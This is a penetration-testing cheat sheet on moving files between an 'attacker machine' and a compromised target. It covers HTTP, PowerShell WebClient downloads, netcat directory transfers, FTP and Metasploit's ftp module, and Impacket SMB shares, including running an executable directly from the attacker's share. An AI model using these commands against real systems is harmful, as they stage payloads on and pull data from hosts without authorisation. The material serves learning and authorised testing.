# File Transfer

File can either be transferred by:

* Push file to target
* Have the target to pull file back

## HTTP

**On attacker machine**:

### Apache

copy file to `/var/www/html/`

Start Apache Server

```
/etc/init.d/apache2 start
```

### Python

By running below, current directory will be accessible over HTTP

```
python -m SimpleHTTPServer [port no]
```

**On target machine**:

```text
http://your_ip_address:your_port_num/filename
```

If you only have command line access in a Windows machine, use PowerShell's WebClient object:

```text
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://[ip_address]/[file]','[file dest]')"
```

or use cmd.exe to trigger IE

```text
cd Program Files\Internet Explorer start iexplore.exe "http://ip_address/file"
```

## Netcat

### Receiving end
```
nc -l -p 1234 > out.file
```
### Sending end

```
nc -w 3 [destination] 1234 < out.file
```

For faster transfers if both sender and receiver has some basic *nix tools installed, you can compress the file during sending process,

### Receiving end

```
nc -l -p 1234 | uncompress -c | tar xvfp -
```

### Sending end

```
tar cfp - /some/dir | compress -c | nc -w 3 [destination] 1234
```

## FTP

### vsftpd/pytftpd

**On attacker machine**:

`vsftpd` or simply the `pytftpd` library

```text
apt-get install python-pyftpdlib
python -m pyftpdlib -p [port_num]
```

default port is 2121

`-w` can grant the user write access

### Metasploit

Metasploit has an ftp module `auxiliary/server/ftp`

```text
use auxiliary/server/ftp
set FTPROOT /root/shells
exploit
```

Can be kill with:

> jobs -k \[id\]

**On target machine**:

Type it into your cmd.exe

```text
echo open your_ip_address > ftp_commands.txt  
echo your_username >> ftp_commands.txt  
echo your_password >> ftp_commands.txt  
echo binary >> ftp_commands.txt  
echo get your_file >> ftp_commands.txt  
echo bye >> ftp_commands.txt  
ftp -s:ftp_commands.txt
```

## SMB

**On attacker machine**:

> `smbserver.py shareName sharePath` `(e.g. smbserver.py TMP /tmp)`

Check with smbclient to confirm we have got an SMB share up and running

> `smbclient -L [attack machine ip address] --no-pass`

**On target machine**:

> `net view \\\\[attack machine ip address]`

Copy file `copy \\[attack machine ip address]\Sharepath .`

Or execute the file directly from SMB `\\[attack machine ip address]\file.exe`

### Windows to Windows

Create a new local file share:

`NET SHARE work=C:\docs\work /REMARK:"work share" /CACHE:No`

Delete the share:

`NET SHARE work /DELETE`

List the File/Printer shares on a remote computer:

`NET VIEW \\ComputerName`

List all the shares in the domain:

`NET VIEW /DOMAIN`

Join a file share \(Drive MAP\):

`NET USE [driveletter:] \\ComputerName\ShareName`

\(replace \[driveletter:\] with the drive letter you want to assign\).

### Linux to Windows

Backup and modify `/etc/samba/smb.conf`

Add the following configuration

```text
[sharedname]
path = [path to share]
available  = yes
valid users = [current user]
read only = no
browsable = yes
public = yes
writable = yes
```

Add user and password `smbpasswd -a [current user]`

List user `pdbedit -L`

Restart SMB service `service smb restart`

or

`sudo /etc/init.d/samba restart`

Access the IP address of the computer from Windows

